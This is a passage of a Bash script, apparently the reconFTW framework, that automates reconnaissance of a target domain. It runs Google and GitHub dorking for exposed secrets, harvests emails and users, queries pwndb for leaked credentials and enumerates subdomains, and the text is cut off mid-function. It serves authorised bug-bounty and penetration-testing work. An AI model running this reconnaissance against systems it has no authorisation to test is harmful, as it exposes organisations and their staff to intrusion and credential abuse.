#!/bin/bash

. ./reconftw.cfg

SCRIPTPATH="$( cd "$(dirname "$0")" >/dev/null 2>&1 ; pwd -P )"

function banner(){
	printf "\n${bgreen}"
	printf "  ██▀███  ▓█████  ▄████▄   ▒█████   ███▄    █   █████▒▄▄▄█████▓ █     █░\n"
	printf " ▓██ ▒ ██▒▓█   ▀ ▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █ ▓██   ▒ ▓  ██▒ ▓▒▓█░ █ ░█░\n"
	printf " ▓██ ░▄█ ▒▒███   ▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒▒████ ░ ▒ ▓██░ ▒░▒█░ █ ░█ \n"
	printf " ▒██▀▀█▄  ▒▓█  ▄ ▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒░▓█▒  ░ ░ ▓██▓ ░ ░█░ █ ░█ \n"
	printf " ░██▓ ▒██▒░▒████▒▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░░▒█░      ▒██▒ ░ ░░██▒██▓ \n"
	printf " ░ ▒▓ ░▒▓░░░ ▒░ ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒ ░      ▒ ░░   ░ ▓░▒ ▒  \n"
	printf "   ░▒ ░ ▒░ ░ ░  ░  ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░ ░          ░      ▒ ░ ░  \n"
	printf "   ░░   ░    ░   ░        ░ ░ ░ ▒     ░   ░ ░  ░ ░      ░        ░   ░  \n"
	printf "    ░        ░  ░░ ░          ░ ░           ░                      ░    \n"
	printf "                 ░                                                      \n"
	printf "			                                     by @six2dez${reset}\n"
}

###############################################################################################################
################################################### TOOLS #####################################################
###############################################################################################################

function tools_installed(){

	printf "\n\n${bgreen}#######################################################################\n"
	printf "${bblue} Checking installed tools ${reset}\n\n"

	allinstalled=true

	[ -n "$GOPATH" ] || { printf "${bred} [*] GOPATH var		[NO]${reset}\n"; allinstalled=false;}
	[ -n "$GOROOT" ] || { printf "${bred} [*] GOROOT var		[NO]${reset}\n"; allinstalled=false;}
	[ -n "$PATH" ] || { printf "${bred} [*] PATH var		[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/degoogle_hunter/degoogle.py ] || { printf "${bred} [*] degoogle		[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/ParamSpider/paramspider.py ] || { printf "${bred} [*] Paramspider	[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/fav-up/favUp.py ] || { printf "${bred} [*] fav-up		[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/Corsy/corsy.py ] || { printf "${bred} [*] Corsy		[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/testssl.sh/testssl.sh ] || { printf "${bred} [*] testssl		[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/CMSeeK/cmseek.py ] || { printf "${bred} [*] CMSeeK		[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/fuzz_wordlist.txt ] || { printf "${bred} [*] OneListForAll	[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/LinkFinder/linkfinder.py ] || { printf "${bred} [*] LinkFinder	        [NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/GitDorker/GitDorker.py ] || { printf "${bred} [*] GitDorker	        [NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/webscreenshot/webscreenshot.py ] || { printf "${bred} [*] webscreenshot	[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/degoogle_hunter/degoogle_hunter.sh ] || { printf "${bred} [*] degoogle_hunter	[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/getjswords.py ] || { printf "${bred} [*] getjswords   	[NO]${reset}\n"; allinstalled=false;}
	eval type -P arjun $DEBUG_STD || { printf "${bred} [*] Arjun		[NO]${reset}\n"; allinstalled=false;}
	eval type -P github-endpoints $DEBUG_STD || { printf "${bred} [*] github-endpoints		[NO]${reset}\n"; allinstalled=false;}
	eval type -P gospider $DEBUG_STD || { printf "${bred} [*] gospider		[NO]${reset}\n"; allinstalled=false;}
	eval type -P subfinder $DEBUG_STD || { printf "${bred} [*] Subfinder		[NO]${reset}\n"; allinstalled=false;}
	eval type -P assetfinder $DEBUG_STD || { printf "${bred} [*] Assetfinder		[NO]${reset}\n"; allinstalled=false;}
	eval type -P findomain $DEBUG_STD || { printf "${bred} [*] Findomain		[NO]${reset}\n"; allinstalled=false;}
	eval type -P amass $DEBUG_STD || { printf "${bred} [*] Amass		[NO]${reset}\n"; allinstalled=false;}
	eval type -P crobat $DEBUG_STD || { printf "${bred} [*] Crobat		[NO]${reset}\n"; allinstalled=false;}
	eval type -P waybackurls $DEBUG_STD || { printf "${bred} [*] Waybackurls		[NO]${reset}\n"; allinstalled=false;}
	eval type -P gau $DEBUG_STD || { printf "${bred} [*] Gau		[NO]${reset}\n"; allinstalled=false;}
	eval type -P dnsx $DEBUG_STD || { printf "${bred} [*] dnsx		[NO]${reset}\n"; allinstalled=false;}
	eval type -P shuffledns $DEBUG_STD || { printf "${bred} [*] ShuffleDns		[NO]${reset}\n"; allinstalled=false;}
	eval type -P cf-check $DEBUG_STD || { printf "${bred} [*] Cf-check		[NO]${reset}\n"; allinstalled=false;}
	eval type -P nuclei $DEBUG_STD || { printf "${bred} [*] Nuclei		[NO]${reset}\n"; allinstalled=false;}
	[ -d ~/nuclei-templates ] || { printf "${bred} [*] Nuclei templates    [NO]${reset}\n"; allinstalled=false;}
	eval type -P gf $DEBUG_STD || { printf "${bred} [*] Gf		[NO]${reset}\n"; allinstalled=false;}
	eval type -P Gxss $DEBUG_STD || { printf "${bred} [*] Gxss		[NO]${reset}\n"; allinstalled=false;}
	eval type -P subjs $DEBUG_STD || { printf "${bred} [*] subjs		[NO]${reset}\n"; allinstalled=false;}
	eval type -P ffuf $DEBUG_STD || { printf "${bred} [*] ffuf		[NO]${reset}\n"; allinstalled=false;}
	eval type -P massdns $DEBUG_STD || { printf "${bred} [*] Massdns		[NO]${reset}\n"; allinstalled=false;}
	eval type -P qsreplace $DEBUG_STD || { printf "${bred} [*] qsreplace		[NO]${reset}\n"; allinstalled=false;}
	eval type -P interlace $DEBUG_STD || { printf "${bred} [*] interlace		[NO]${reset}\n"; allinstalled=false;}
	eval type -P dnsgen $DEBUG_STD || { printf "${bred} [*] DnsGen		[NO]${reset}\n"; allinstalled=false;}
	eval type -P anew $DEBUG_STD || { printf "${bred} [*] Anew		[NO]${reset}\n"; allinstalled=false;}
	eval type -P unfurl $DEBUG_STD || { printf "${bred} [*] unfurl		[NO]${reset}\n"; allinstalled=false;}
	eval type -P crlfuzz $DEBUG_STD || { printf "${bred} [*] crlfuzz		[NO]${reset}\n"; allinstalled=false;}
	eval type -P httpx $DEBUG_STD || { printf "${bred} [*] Httpx		[NO]${reset}\n${reset}"; allinstalled=false;}
	eval type -P jq $DEBUG_STD || { printf "${bred} [*] jq			[NO]${reset}\n${reset}"; allinstalled=false;}
	eval type -P notify $DEBUG_STD || { printf "${bred} [*] notify		[NO]${reset}\n${reset}"; allinstalled=false;}

	if [ "${allinstalled}" = true ] ; then
		printf "${bgreen} Good! All installed! ${reset}\n\n"
	else
		printf "\n${yellow} Try running the installer script again ./install.sh"
		printf "\n${yellow} If it fails for any reason try to install manually the tools missed"
		printf "\n${yellow} Finally remember to set the ${bred}\$tools${yellow} variable at the start of this script"
		printf "\n${yellow} If nothing works and the world is gonna end you can always ping me :D ${reset}\n\n"
	fi

	printf "${bblue} Tools check finished\n"
	printf "${bgreen}#######################################################################\n"
}

function tools_full(){

	printf "\n\n${bgreen}#######################################################################\n"
	printf "${bblue} Checking installed tools ${reset}\n\n"
	[ -n "$GOPATH" ] && printf "${bgreen}[*] GOPATH var		[YES]${reset}\n" || { printf "${bred} [*] GOPATH var		[NO]${reset}\n"; }
	[ -n "$GOROOT" ] && printf "${bgreen}[*] GOROOT var		[YES]${reset}\n" || { printf "${bred} [*] GOROOT var		[NO]${reset}\n"; }
	[ -n "$PATH" ] && printf "${bgreen}[*] PATH var		[YES]${reset}\n" || { printf "${bred} [*] PATH var		[NO]${reset}\n"; }
	[ -f $tools/degoogle_hunter/degoogle.py ] && printf "${bgreen}[*] degoogle		[YES]${reset}\n" || printf "${bred} [*] degoogle		[NO]${reset}\n"
	[ -f $tools/ParamSpider/paramspider.py ] && printf "${bgreen}[*] Paramspider		[YES]${reset}\n" || printf "${bred} [*] Paramspider	[NO]${reset}\n"
	[ -f $tools/fav-up/favUp.py ] && printf "${bgreen}[*] fav-up		[YES]${reset}\n" || printf "${bred} [*] fav-up		[NO]${reset}\n"
	[ -f $tools/Corsy/corsy.py ] && printf "${bgreen}[*] Corsy		[YES]${reset}\n" || printf "${bred} [*] Corsy		[NO]${reset}\n"
	[ -f $tools/testssl.sh/testssl.sh ] && printf "${bgreen}[*] testssl		[YES]${reset}\n" || printf "${bred} [*] testssl		[NO]${reset}\n"
	[ -f $tools/CMSeeK/cmseek.py ] && printf "${bgreen}[*] CMSeeK		[YES]${reset}\n" || printf "${bred} [*] CMSeeK		[NO]${reset}\n"
	[ -f $tools/fuzz_wordlist.txt ] && printf "${bgreen}[*] OneListForAll	[YES]${reset}\n" || printf "${bred} [*] OneListForAll	[NO]${reset}\n"
	[ -f $tools/LinkFinder/linkfinder.py ] && printf "${bgreen}[*] LinkFinder	        [YES]${reset}\n" || printf "${bred} [*] LinkFinder	        [NO]${reset}\n"
	[ -f $tools/degoogle_hunter/degoogle_hunter.sh ] && printf "${bgreen}[*] degoogle_hunter	[YES]${reset}\n" || printf "${bred} [*] degoogle_hunter	[NO]${reset}\n"
	[ -f $tools/GitDorker/GitDorker.py ] && printf "${bgreen}[*] GitDorker		[YES]${reset}\n" || printf "${bred} [*] GitDorker		[NO]${reset}\n"
	[ -f $tools/webscreenshot/webscreenshot.py ] && printf "${bgreen}[*] webscreenshot	[YES]${reset}\n" || printf "${bred} [*] webscreenshot	[NO]${reset}\n"
	[ -f $tools/getjswords.py ] && printf "${bgreen}[*] getjswords.py	[YES]${reset}\n" || printf "${bred} [*] getjswords.py	[NO]${reset}\n"
	eval type -P arjun $DEBUG_STD && printf "${bgreen}[*] Arjun		[YES]${reset}\n" || { printf "${bred} [*] Arjun		[NO]${reset}\n"; }
	eval type -P github-endpoints $DEBUG_STD && printf "${bgreen}[*] github-endpoints	[YES]${reset}\n" || { printf "${bred} [*] github-endpoints	[NO]${reset}\n"; }
	eval type -P gospider $DEBUG_STD && printf "${bgreen}[*] gospider		[YES]${reset}\n" || { printf "${bred} [*] gospider		[NO]${reset}\n"; }
	eval type -P subfinder $DEBUG_STD && printf "${bgreen}[*] Subfinder		[YES]${reset}\n" || { printf "${bred} [*] Subfinder		[NO]${reset}\n"; }
	eval type -P assetfinder $DEBUG_STD && printf "${bgreen}[*] Assetfinder		[YES]${reset}\n" || { printf "${bred} [*] Assetfinder	[NO]${reset}\n"; }
	eval type -P findomain $DEBUG_STD && printf "${bgreen}[*] Findomain		[YES]${reset}\n" || { printf "${bred} [*] Findomain		[NO]${reset}\n"; }
	eval type -P amass $DEBUG_STD && printf "${bgreen}[*] Amass		[YES]${reset}\n" || { printf "${bred} [*] Amass		[NO]${reset}\n"; }
	eval type -P crobat $DEBUG_STD && printf "${bgreen}[*] Crobat		[YES]${reset}\n" || { printf "${bred} [*] Crobat		[NO]${reset}\n"; }
	eval type -P waybackurls $DEBUG_STD && printf "${bgreen}[*] Waybackurls		[YES]${reset}\n" || { printf "${bred} [*] Waybackurls	[NO]${reset}\n"; }
	eval type -P gau $DEBUG_STD && printf "${bgreen}[*] Gau		        [YES]${reset}\n" || { printf "${bred} [*] Gau		[NO]${reset}\n"; }
	eval type -P dnsx $DEBUG_STD && printf "${bgreen}[*] dnsx		[YES]${reset}\n" || { printf "${bred} [*] dnsx		[NO]${reset}\n"; }
	eval type -P shuffledns $DEBUG_STD && printf "${bgreen}[*] ShuffleDns		[YES]${reset}\n" || { printf "${bred} [*] ShuffleDns		[NO]${reset}\n"; }
	eval type -P cf-check $DEBUG_STD && printf "${bgreen}[*] Cf-check		[YES]${reset}\n" || { printf "${bred} [*] Cf-check		[NO]${reset}\n"; }
	eval type -P nuclei $DEBUG_STD && printf "${bgreen}[*] Nuclei		[YES]${reset}\n" || { printf "${bred} [*] Nuclei		[NO]${reset}\n"; }
	[ -d ~/nuclei-templates ] && printf "${bgreen}[*] Nuclei templates  	[YES]${reset}\n" || printf "${bred} [*] Nuclei templates  	[NO]${reset}\n"
	eval type -P gf $DEBUG_STD && printf "${bgreen}[*] Gf		        [YES]${reset}\n" || { printf "${bred} [*] Gf			[NO]${reset}\n"; }
	eval type -P Gxss $DEBUG_STD && printf "${bgreen}[*] Gxss		[YES]${reset}\n" || { printf "${bred} [*] Gxss		[NO]${reset}\n"; }
	eval type -P subjs $DEBUG_STD && printf "${bgreen}[*] subjs		[YES]${reset}\n" || { printf "${bred} [*] subjs		[NO]${reset}\n"; }
	eval type -P ffuf $DEBUG_STD && printf "${bgreen}[*] ffuf		[YES]${reset}\n" || { printf "${bred} [*] ffuf		[NO]${reset}\n"; }
	eval type -P massdns $DEBUG_STD && printf "${bgreen}[*] Massdns		[YES]${reset}\n" || { printf "${bred} [*] Massdns		[NO]${reset}\n"; }
	eval type -P qsreplace $DEBUG_STD && printf "${bgreen}[*] qsreplace		[YES]${reset}\n" || { printf "${bred} [*] qsreplace		[NO]${reset}\n"; }
	eval type -P interlace $DEBUG_STD && printf "${bgreen}[*] interlace		[YES]${reset}\n" || { printf "${bred} [*] interlace		[NO]${reset}\n"; }
	eval type -P dnsgen $DEBUG_STD && printf "${bgreen}[*] DnsGen		[YES]${reset}\n" || { printf "${bred} [*] DnsGen		[NO]${reset}\n"; }
	eval type -P anew $DEBUG_STD && printf "${bgreen}[*] Anew		[YES]${reset}\n" || { printf "${bred} [*] Anew		[NO]${reset}\n"; }
	eval type -P unfurl $DEBUG_STD && printf "${bgreen}[*] unfurl		[YES]${reset}\n" || { printf "${bred} [*] unfurl		[NO]${reset}\n"; }
	eval type -P crlfuzz $DEBUG_STD && printf "${bgreen}[*] crlfuzz		[YES]${reset}\n" || { printf "${bred} [*] crlfuzz		[NO]${reset}\n"; }
	eval type -P httpx $DEBUG_STD && printf "${bgreen}[*] Httpx		[YES]${reset}\n${reset}" || { printf "${bred} [*] Httpx		[NO]${reset}\n${reset}"; }
	eval type -P jq $DEBUG_STD && printf "${bgreen}[*] jq			[YES]${reset}\n${reset}" || { printf "${bred} [*] jq			[NO]${reset}\n${reset}"; }
	eval type -P notify $DEBUG_STD && printf "${bgreen}[*] notify		[YES]${reset}\n${reset}" || { printf "${bred} [*] notify		[NO]${reset}\n${reset}"; }

	printf "\n${yellow} If any tool is not installed under $tools, I trust in your ability to install it :D\n Also remember to set the ${bred}\$tools${yellow} variable at the start of this script.\n If you have any problem you can always ping me ;) ${reset}\n\n"
	printf "${bblue} Tools check finished\n"
	printf "${bgreen}#######################################################################\n"
}



###############################################################################################################
################################################### OSINT #####################################################
###############################################################################################################

function google_dorks(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] && [ "$DORKS" = true ]
	then
		start=`date +%s`
		printf "${bgreen}#######################################################################\n"
		printf "${bblue} Performing Google Dorks ${reset}\n\n"
		$tools/degoogle_hunter/degoogle_hunter.sh $domain | tee osint/dorks.txt
		sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" osint/dorks.txt && touch $called_fn_dir/.${FUNCNAME[0]}
		end=`date +%s`
		getElapsedTime $start $end
		printf "$\n${bblue} Finished in ${runtime} Happy hunting! ${reset}\n"
		printf "${bgreen}#######################################################################\n"
	else
		printf "${yellow} ${FUNCNAME[0]} are already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
	fi
}

function github_dorks(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$DORKS" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} GitHub Dorks Scanning ${reset}\n\n"
			start=`date +%s`
			if [ -s "${GITHUB_TOKENS}" ]
			then
				if [ "$DEEP" = true ] ; then
					eval python3 $tools/GitDorker/GitDorker.py -tf ${GITHUB_TOKENS} -e 5 -q $domain -p -d $tools/GitDorker/Dorks/alldorksv3 | grep "\[+\]" | grep "git" | anew -q osint/gitdorks.txt $DEBUG_STD
				else
					eval python3 $tools/GitDorker/GitDorker.py -tf ${GITHUB_TOKENS} -e 5 -q $domain -p -d $tools/GitDorker/Dorks/medium_dorks.txt | grep "\[+\]" | grep "git" | anew -q osint/gitdorks.txt $DEBUG_STD
				fi
				sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" osint/gitdorks.txt
			else
				printf "\n${bred} Required file ${GITHUB_TOKENS} not exists or empty${reset}\n"
			fi
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n GitHub Dorks Finished in ${runtime}\n"
			printf "${bblue} Results are saved in osint/gitdorks.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$DORKS" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function metadata(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$METADATA" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Metadata scan ${reset}\n"
			start=`date +%s`
			eval metafinder -d $domain -l 20 -o osint -go -bi -ba $DEBUG_STD
			eval mv osint/${domain}/* osint/ $DEBUG_ERROR
			eval rmdir osint/${domain} $DEBUG_ERROR
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n Metadata scan in ${runtime}${reset}\n"
			printf "${bblue} Results are saved in osint folder ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			if [ "$METADATA" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function emails(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$EMAILS" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Emails search ${reset}\n"
			start=`date +%s`
			cd $tools/theHarvester
			eval python3 theHarvester.py -d $domain -b all $DEBUG_ERROR > $dir/.tmp/harvester.txt
			cd $dir
			cat .tmp/harvester.txt | awk '/Emails/,/Hosts/' | sed -e '1,2d' | head -n -2 | anew -q osint/emails.txt
			cat .tmp/harvester.txt | awk '/Users/,/IPs/' | sed -e '1,2d' | head -n -2 | anew -q osint/users.txt
			cat .tmp/harvester.txt | awk '/Links/,/Users/' | sed -e '1,2d' | head -n -2 | anew -q osint/linkedin.txt
			cd $tools/pwndb && python3 pwndb.py --target "@${domain}" | anew -q $dir/osint/pwndb.txt
			cd $dir
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n Emails Search Finished in ${runtime}${reset}\n"
			printf "${bblue} Results are saved in osint folder ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			if [ "$EMAILS" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi

	fi
}

function domain_info(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$DOMAIN_INFO" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Domain info search ${reset}\n"
			start=`date +%s`

			lynx -dump https://domainbigdata.com/${domain} | tail -n +19 > osint/domain_info_general.txt

			cat osint/domain_info_general.txt | grep '/nj/' | tr -s ' ' ',' | cut -d ',' -f3 > .tmp/domain_registrant_name.txt
			cat osint/domain_info_general.txt | grep '/mj/' | tr -s ' ' ',' | cut -d ',' -f3 > .tmp/domain_registrant_email.txt
			cat osint/domain_info_general.txt | grep -E "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | grep "https://domainbigdata.com" | tr -s ' ' ',' | cut -d ',' -f3 > .tmp/domain_registrant_ip.txt

			sed -i -n '/Copyright/q;p' osint/domain_info_general.txt

			if [ -s ".tmp/domain_registrant_name.txt" ]
			then
				for line in $(cat .tmp/domain_registrant_name.txt); do
					lynx -dump $line | tail -n +18 | sed -n '/]domainbigdata.com/q;p' >> osint/domain_info_name.txt && echo -e "\n\n#######################################################################\n\n" >> osint/domain_info_name.txt
				done
			fi

			if [ -s ".tmp/domain_registrant_email.txt" ]
			then
				for sub in $(cat .tmp/domain_registrant_email.txt); do
					lynx -dump $line | tail -n +18 | sed -n '/]domainbigdata.com/q;p'  >> osint/domain_info_email.txt && echo -e "\n\n#######################################################################\n\n" >> osint/domain_info_email.txt
				done
			fi

			if [ -s ".tmp/domain_registrant_ip.txt" ]
			then
				for sub in $(cat .tmp/domain_registrant_ip.txt); do
					lynx -dump $line | tail -n +18 | sed -n '/]domainbigdata.com/q;p'  >> osint/domain_info_ip.txt && echo -e "\n\n#######################################################################\n\n" >> osint/domain_info_ip.txt
				done
			fi
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n Domain Info Search Finished in ${runtime}${reset}\n"
			printf "${bblue} Results are saved in osint folder ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			if [ "$DOMAIN_INFO" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}


###############################################################################################################
############################################### SUBDOMAINS ####################################################
###############################################################################################################

function subdomains_full(){
	NUMOFLINES_subs="0"
	NUMOFLINES_probed="0"
	printf "${bgreen}#######################################################################\n\n"
	printf "${bblue} Subdomain Enumeration\n\n"
	if [ -f "subdomains/subdomains.txt" ]
	then
		eval cp subdomains/subdomains.txt .tmp/subdomains_old.txt $DEBUG_ERROR
	fi
	if [ -f "webs/webs.txt" ]
	then
		eval cp webs/webs.txt .tmp/probed_old.txt $DEBUG_ERROR
	fi
	sub_passive
	sub_crt
	sub_brute
	sub_dns
	sub_scraping
	sub_permut
	webprobe_simple
	if [ -f "subdomains/subdomains.txt" ]
		then
			deleteOutScoped $outOfScope_file subdomains/subdomains.txt
			NUMOFLINES_subs=$(eval cat subdomains/subdomains.txt $DEBUG_ERROR | anew .tmp/subdomains_old.txt | wc -l)
	fi
	if [ -f "webs/webs.txt" ]
		then
			deleteOutScoped $outOfScope_file webs/webs.txt
			NUMOFLINES_probed=$(eval cat webs/webs.txt $DEBUG_ERROR | anew .tmp/probed_old.txt | wc -l)
	fi
	printf "${bblue}\n Total subdomains: ${reset}\n\n"
	text="${bred}\n - ${NUMOFLINES_subs} new alive subdomains${reset}\n\n"
	printf "${text}" && printf "${text}" | $NOTIFY
	eval cat subdomains/subdomains.txt $DEBUG_ERROR | sort
	text="${bred}\n - ${NUMOFLINES_probed} new web probed${reset}\n\n"
	printf "${text}" && printf "${text}" | $NOTIFY
	eval cat webs/webs.txt $DEBUG_ERROR | sort
	text="${bblue}\n Subdomain Enumeration Finished\n"
	printf "${text}" && printf "${text}" | $NOTIFY
	printf "${bblue} Results are saved in subdomains/subdomains.txt and webs/webs.txt${reset}\n"
	printf "${bgreen}#######################################################################\n\n"
}

function sub_passive(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Passive Subdomain Enumeration${reset}\n"
			eval subfinder -d $domain -o .tmp/subfinder.txt $DEBUG_STD
			eval assetfinder --subs-only $domain $DEBUG_ERROR | anew -q .tmp/assetfinder.txt
			eval amass enum -passive -d $domain -config $AMASS_CONFIG -o .tmp/amass.txt $DEBUG_STD
			eval findomain --quiet -t $domain -u .tmp/findomain.txt $DEBUG_STD
			eval crobat -s $domain $DEBUG_ERROR | anew -q .tmp/crobat.txt
			timeout 5m waybackurls $domain | unfurl --unique domains | anew -q .tmp/waybackurls.txt
			NUMOFLINES=$(eval cat .tmp/subfinder.txt .tmp/assetfinder.txt .tmp/amass.txt .tmp/findomain.txt .tmp/crobat.txt .tmp/waybackurls.txt $DEBUG_ERROR | sed "s/*.//" | anew .tmp/passive_subs.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${green} ${NUMOFLINES} new subdomains by passive found in ${runtime}${reset}\n\n"
			fi
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
	fi
}

function sub_crt(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SUBCRT" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Crtsh Subdomain Enumeration${reset}\n"
			cd $tools/crtfinder
			eval python3 crtfinder.py -u $domain $DEBUG_STD
			outputfile=${domain%%.*}
			if [ "$FULLSCOPE" = true ] ; then
				eval cat ${outputfile}.txt $DEBUG_ERROR | anew -q $dir/.tmp/crtsh_subs_tmp.txt
			else
				eval cat ${outputfile}.txt $DEBUG_ERROR | grep ".$domain$" | anew -q $dir/.tmp/crtsh_subs_tmp.txt
			fi
			if [ "$DEEP" = true ] ; then
				eval python3 dig.py ${outputfile}.txt > more.txt $DEBUG_STD
				if [ "$FULLSCOPE" = true ] ; then
					eval cat more.txt $DEBUG_ERROR | anew -q $dir/.tmp/crtsh_subs_tmp.txt
				else
					eval cat more.txt $DEBUG_ERROR | grep ".$domain$" | anew -q $dir/.tmp/crtsh_subs_tmp.txt
				fi
				eval rm more.txt $DEBUG_ERROR
			fi
			eval rm ${outputfile}.txt $DEBUG_ERROR
			cd $dir
			if [ "$FULLSCOPE" = true ] ; then
				eval curl "https://tls.bufferover.run/dns?q=.${domain}" $DEBUG_ERROR | eval jq -r .Results[] $DEBUG_ERROR | cut -d ',' -f3 | anew -q .tmp/crtsh_subs_tmp.txt
				eval curl "https://dns.bufferover.run/dns?q=.${domain}" $DEBUG_ERROR | eval jq -r '.FDNS_A'[],'.RDNS'[] $DEBUG_ERROR | cut -d ',' -f2 | anew -q .tmp/crtsh_subs_tmp.txt
			else
				eval curl "https://tls.bufferover.run/dns?q=.${domain}" $DEBUG_ERROR | eval jq -r .Results[] $DEBUG_ERROR | cut -d ',' -f3 | grep -F ".$domain" | anew -q .tmp/crtsh_subs.txt
				eval curl "https://dns.bufferover.run/dns?q=.${domain}" $DEBUG_ERROR | eval jq -r '.FDNS_A'[],'.RDNS'[] $DEBUG_ERROR | cut -d ',' -f2 | grep -F ".$domain" | anew -q .tmp/crtsh_subs_tmp.txt
			fi
			touch $called_fn_dir/.${FUNCNAME[0]}
			NUMOFLINES=$(eval cat .tmp/crtsh_subs_tmp.txt $DEBUG_ERROR | anew .tmp/crtsh_subs.txt | wc -l)
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${green} ${NUMOFLINES} new subdomains by certificate transparency found in ${runtime}${reset}\n\n"
			fi
		else
			if [ "$SUBCRT" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function sub_brute(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SUBBRUTE" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Bruteforce Subdomain Enumeration${reset}\n"
			eval shuffledns -d $domain -w $subs_wordlist -r $resolvers -t 5000 -o .tmp/active_tmp.txt $DEBUG_STD
			NUMOFLINES=$(eval cat .tmp/active_tmp.txt $DEBUG_ERROR | sed "s/*.//" | anew .tmp/brute_subs.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${green} ${NUMOFLINES} new subdomains by bruteforce found in ${runtime}${reset}\n\n"
			fi
		else
			if [ "$SUBBRUTE" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function sub_dns(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Active Subdomain Enumeration${reset}\n"
